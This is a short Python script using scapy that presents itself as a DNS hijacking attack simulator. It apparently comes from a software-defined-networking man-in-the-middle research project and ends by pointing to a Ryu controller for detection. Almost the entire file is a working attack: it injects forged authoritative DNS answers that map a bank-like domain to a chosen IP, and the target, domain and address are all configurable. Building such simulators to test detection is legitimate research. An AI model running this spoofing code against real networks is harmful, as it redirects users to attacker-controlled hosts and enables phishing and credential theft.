#!/usr/bin/env python3
"""
dns_hijack.py — DNS Hijacking attack simulator
Integrated from sdn-mitm-attacks-research project.
"""

import sys, time
from scapy.all import *

TARGET_DNS_SERVER = sys.argv[1] if len(sys.argv) > 1 else "10.0.0.2"
HIJACK_DOMAIN     = sys.argv[2] if len(sys.argv) > 2 else "securebank.com"
FAKE_IP           = sys.argv[3] if len(sys.argv) > 3 else "10.0.0.100"
IFACE             = sys.argv[4] if len(sys.argv) > 4 else None
LOG               = "/tmp/dns_hijack_output.txt"

def log(msg):
    ts = time.strftime('%H:%M:%S')
    line = f"[{ts}] {msg}"
    print(line, flush=True)
    try:
        open(LOG, 'a').write(line + "\n")
    except:
        pass

if not IFACE:
    for iface in get_if_list():
        try:
            ip = get_if_addr(iface)
            if ip.startswith('10.0.0.'):
                IFACE = iface
                break
        except:
            continue
    if not IFACE:
        IFACE = str(conf.iface)

MY_MAC = get_if_hwaddr(IFACE)
MY_IP  = get_if_addr(IFACE)

log(f"[DNS-HIJACK] Targeting DNS server: {TARGET_DNS_SERVER}")
log(f"[DNS-HIJACK] Hijacking domain: {HIJACK_DOMAIN} → {FAKE_IP}")
log(f"[DNS-HIJACK] Interface: {IFACE} ({MY_IP})")

log("[DNS-HIJACK] Phase 1: Legitimate DNS queries …")
for i in range(5):
    pkt = (
        Ether(src=MY_MAC, dst="ff:ff:ff:ff:ff:ff") /
        IP(src=MY_IP, dst=TARGET_DNS_SERVER) /
        UDP(sport=RandShort(), dport=53) /
        DNS(rd=1, qd=DNSQR(qname=HIJACK_DOMAIN))
    )
    sendp(pkt, iface=IFACE, verbose=False)
    time.sleep(0.2)

log("[DNS-HIJACK] Phase 2: Injecting fake DNS responses …")
for i in range(20):
    pkt = (
        Ether(src=MY_MAC, dst="ff:ff:ff:ff:ff:ff") /
        IP(src=MY_IP, dst=TARGET_DNS_SERVER) /
        UDP(sport=53, dport=RandShort()) /
        DNS(
            id=i+100, qr=1, aa=1, rd=1, ra=1,
            qdcount=1, ancount=1,
            qd=DNSQR(qname=HIJACK_DOMAIN),
            an=DNSRR(rrname=HIJACK_DOMAIN, type='A', rclass='IN',
                     ttl=60, rdata=FAKE_IP)
        )
    )
    sendp(pkt, iface=IFACE, verbose=False)
    if i % 5 == 0:
        log(f"[DNS-HIJACK] Injected {i+1}/20 fake responses")
    time.sleep(0.15)

log("[DNS-HIJACK] Done — check Ryu for DNS HIJACKING detection")
